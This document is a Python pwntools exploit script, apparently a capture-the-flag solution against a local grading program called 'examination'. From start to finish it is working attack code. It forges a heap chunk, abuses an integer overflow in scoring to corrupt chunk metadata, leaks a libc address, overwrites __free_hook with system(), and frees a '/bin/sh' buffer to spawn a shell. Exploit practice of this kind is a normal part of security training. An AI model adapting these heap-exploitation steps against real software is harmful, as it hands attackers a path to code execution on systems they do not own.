from pwn import *
context(arch='amd64', log_level='debug')

io = process('./examination')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

students = [0, 0, 0, 0, 0, 0, 0]
reviews = [None, None, None, None, None, None, None]
chunk_addr = [0, 0, 0, 0, 0, 0, 0]
scores = [0, 0, 0, 0, 0, 0, 0]
current_role = 0
current_sid = 0
student_num = 0

def add_student(q):
	global student_num
	assert(current_role == 0)
	io.sendlineafter(b'choice>> ', b'1')
	io.sendlineafter(b'enter the number of questions: ', str(q).encode())
	students[student_num] = 1
	chunk_addr[student_num] = 'unknown'
	student_num += 1

def give_score():
	assert(current_role == 0)
	io.sendlineafter(b'choice>> ', b'2')
	io.recvuntil(b'marking testing papers.....\n')
	sid = 0
	while True:
		s = io.recvuntil(b'\n', drop=True)
		if s == b'finish':
			break
		elif b'score' in s:
			sid = s[14] - 0x30
			scores[sid] = int(s[29:].decode(), 10)
		else:
			scores[sid] -= 10
			if scores[sid] < 0:
				scores[sid] += 256
	
def write_review(sid, size, comment, bytes=False, enter=True):
	assert(current_role == 0 and students[sid] == 1)
	io.sendlineafter(b'choice>> ', b'3')
	io.sendlineafter(b'which one? > ', str(sid).encode())
	if reviews[sid] is None:
		io.sendlineafter(b'please input the size of comment: ', str(size).encode())
	if enter:
		if not bytes:
			io.sendlineafter(b'enter your comment:', comment.encode())
		else:
			io.sendlineafter(b'enter your comment:', comment)
	else:
		if not bytes:
			io.sendafter(b'enter your comment:', comment.encode())
		else:
			io.sendafter(b'enter your comment:', comment)
	reviews[sid] = comment

def call_parent(sid):
	global student_num
	assert(current_role == 0 and students[sid] == 1)
	io.sendlineafter(b'choice>> ', b'4')
	io.sendlineafter(b'which student id to choose?', str(sid).encode())
	students[sid] = 2
	reviews[sid] = None
	student_num -= 1

def change_role(role):
	global current_role
	io.sendlineafter(b'choice>> ', b'5')
	io.sendlineafter(b'role: <0.teacher/1.student>: ', str(role).encode())
	current_role = role

def check_review(address, offset=True):
	assert(current_role == 1)
	io.sendlineafter(b'choice>> ', b'2')
	if io.recv(4) == b'Good':
		c = chunk_addr[current_sid] = int(io.recvuntil(b'add', drop=True)[-13:].decode(), 16)
		chunk_addr[current_sid] -= 0x10		# get the address of chunk head instead of writable head
		io.sendlineafter(b'wherever you want! addr: ', str((c + address) * 10).encode())

def pray():
	assert(current_role == 1)
	io.sendlineafter(b'choice>> ', b'3')

def change_sid(sid):
	global current_sid
	assert(current_role == 1 and students[sid] != 0)
	io.sendlineafter(b'choice>> ', b'6')
	io.sendlineafter(b'input your id: ', str(sid).encode())
	current_sid = sid

def print_status():
	print('students: ', end='')
	print(students)
	print('reviews: ', end='')
	print(reviews)
	print('chunk_addr: ', end='')
	print(chunk_addr)
	print('scores: ', end='')
	print(scores)
	print('current_role: ' + str(current_role))

io.sendlineafter(b'role: <0.teacher/1.student>: ', b'0')
for i in range(7):
	add_student(1)

change_role(0)
write_review(5, 0xF0, 'deadbeef')
write_review(6, 1024-16, 'deadbeef')

### Step 1: construct a fake chunk to bypass the check for free() of student 6
write_review(4, 0x200, b'a' * 0xF0 + p64(0x500) + p64(0x21) + p64(0) * 3 + p64(0x21), True)

### Step 2: give student 4 reward to change the chunk address of student 5 to that of student 6
change_role(1)
change_sid(4)
pray()

change_role(0)
give_score()	# int overflow

change_role(1)
change_sid(4)
check_review(0x39 + 0x50)
chunk_addr[4] += 0x200

### Step 3: give student 6 reward to change the chunk size of student 6 to 0x100 more
change_role(1)
change_sid(6)
pray()

change_role(0)
give_score()	# int overflow

change_role(1)
change_sid(6)
check_review(0x48 + 0x100 + 1)

### Step 4: delete student 6 to free the chunk with fake size: 0x500
change_role(0)
call_parent(6)

### Step 5: read the comment of student 5 to get and calculate the libc address
change_role(1)
change_sid(5)

io.sendlineafter(b'choice>> ', b'2')
io.recvuntil(b'here is the review:\n')
main_arena = u64(io.recv(6) + b'\x00\x00') - 96
libc_base = main_arena - (libc.symbols['__malloc_hook'] + 0x10)
sys_addr = libc_base + libc.symbols['system']		# system address got
malloc_hook = libc_base + libc.symbols['__malloc_hook']
free_hook = libc_base + libc.symbols['__free_hook']

### Step 6: get student 6 back, now the pointer of student 6 should be in the chunk of student 5
change_role(0)
add_student(1)

### Step 7: write comment for student 6: '/bin/sh'
write_review(6, 10, '/bin/sh')

### Step 8: change the address of student 6 to write system address to __free_hook
stu6_writeaddr = chunk_addr[4] + 0x50	# address of student 6 to write to

payload = p64(chunk_addr[4] + 0x30)	# address of student 6 header chunk
payload += p64(0) * 4
payload += p64(0x21)	# size of student 6 header chunk
payload += p64(1)
payload += p64(free_hook)	# change the write address of student 6 to __free_hook
write_review(5, 0, payload, bytes=True)

### Step 9: write system address to __free_hook
write_review(6, 0, p64(sys_addr), bytes=True)

### Step 10: change the address of student 6 back to buffer string '/bin/sh'
payload = p64(chunk_addr[4] + 0x30)	# address of student 6 header chunk
payload += p64(0) * 4
payload += p64(0x21)	# size of student 6 header chunk
payload += p64(1)
payload += p64(stu6_writeaddr)
write_review(5, 0, payload, bytes=True)

### Step 11: delete student 6, getshell
change_role(0)
call_parent(6)
io.interactive()
